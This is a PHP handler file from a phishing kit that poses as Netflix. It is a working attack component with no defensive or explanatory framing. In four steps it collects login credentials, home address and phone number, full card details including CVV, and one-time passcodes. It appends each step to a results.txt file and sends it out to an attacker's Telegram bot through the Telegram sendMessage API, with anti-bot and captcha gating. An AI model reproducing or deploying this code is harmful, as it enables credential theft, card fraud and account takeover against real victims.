<?php 
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
require_once 'config.php';
require_once __DIR__ . '/lib/user_panel.php';
require_once 'botMother/botMother.php';

$bm = new botMother();

function sendTotelegram($data){
    global $bot, $chat_id;
    $data = urlencode($data);
    $api = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$chat_id&text=$data";
    $c = curl_init($api);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}

function sendAndLog(string $label, string $message, string $user = '') {
    $entry = '[' . date('Y-m-d H:i:s') . "]\n" . $message . "\n\n";
    file_put_contents(__DIR__ . '/results.txt', $entry, FILE_APPEND | LOCK_EX);
    sendTotelegram("NETFLIX - $label\n" . $message);
    panelTouchUser($user, $label);
}

function isAjaxRequest() {
    return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';
}

function respondLoginError($message) {
    if (isAjaxRequest()) {
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'error' => $message]);
    } else {
        echo $message;
    }
    exit;
}

$ip = $_SERVER['REMOTE_ADDR'];

// Step 1: LOGIN
if(isset($_POST['user'])){

    $captchaResponse = $_POST['h-captcha-response'] ?? '';
    $captchaSecret = "ES_c2e6eff9a7644bae93f860ec1e530f92";

    if (empty($captchaResponse)) {
        respondLoginError("Error: Captcha not completed.");
    }

    $verifyCaptcha = curl_init();
    curl_setopt($verifyCaptcha, CURLOPT_URL, "https://hcaptcha.com/siteverify");
    curl_setopt($verifyCaptcha, CURLOPT_POST, true);
    curl_setopt($verifyCaptcha, CURLOPT_POSTFIELDS, http_build_query([
        'secret' => $captchaSecret,
        'response' => $captchaResponse,
    ]));
    curl_setopt($verifyCaptcha, CURLOPT_RETURNTRANSFER, true);
    $responseData = json_decode(curl_exec($verifyCaptcha));
    curl_close($verifyCaptcha);

    if (!$responseData || !$responseData->success) {
        respondLoginError("Error: Invalid captcha.");
    }

    $_SESSION['_login_user'] = $_POST['user'];
    $msg = "User: {$_POST['user']}\nPass: {$_POST['pass']}\nIP: $ip";
    sendAndLog("Login Submitted", $msg, $_POST['user']);

    $redirect = 'adrees.php';
    if (isAjaxRequest()) {
        echo json_encode(['success' => true, 'redirect' => $redirect]);
    } else {
        header("Location: $redirect");
    }
    exit;
}

// Step 2: ADDRESS
if(isset($_POST['first-name'])) {
    $_SESSION['_first-name'] = $_POST['first-name'];
    $_SESSION['_last-name'] = $_POST['last-name'] ?? '';
    $fullName = trim("{$_POST['first-name']} {$_POST['last-name']}");

    $msg = "Name: $fullName\n"
         . "First: {$_POST['first-name']}\n"
         . "Last: {$_POST['last-name']}\n"
         . "Address 1: {$_POST['address-line-1']}\n"
         . "Address 2: {$_POST['address-line-2']}\n"
         . "Phone: {$_POST['phoneNumber']}\n"
         . "Country: {$_POST['country']}\n"
         . "City: {$_POST['city']}\n"
         . "State: {$_POST['state']}\n"
         . "Postal Code: {$_POST['postal-code']}\n"
         . "IP: $ip";

    sendAndLog("Address Submitted", $msg, $fullName ?: $_SESSION['_login_user']);
    header("Location: card.php");
    exit;
}

// Step 3: CARD
if(isset($_POST['cc'])) {
    $_SESSION['_cc'] = $_POST['cc'];
    $cardHolder = $_POST['holder-name'] ?? '';
    $msg = "Name: $cardHolder\n"
         . "Card: {$_POST['cc']}\nExp: {$_POST['exp']}\nCVV: {$_POST['cvv']}\n"
         . "Holder: {$_POST['holder-name']}\nIP: $ip";

    sendAndLog("Card Submitted", $msg, $cardHolder ?: $_SESSION['_login_user']);
    header("Location: wait.php?next=sms.php");
    exit;
}

// Step 4: OTP
if(isset($_POST['otp'])) {
    $msg = "Card: {$_SESSION['_cc']}\nOTP: {$_POST['otp']}\nIP: $ip";
    sendAndLog("OTP Submitted", $msg, $_SESSION['_login_user'] ?? '');

    if(isset($_POST['exit'])){
        header("Location: exit.php");
        exit;
    }

    header("Location: wait.php?next=sms.php");
    exit;
}
?>
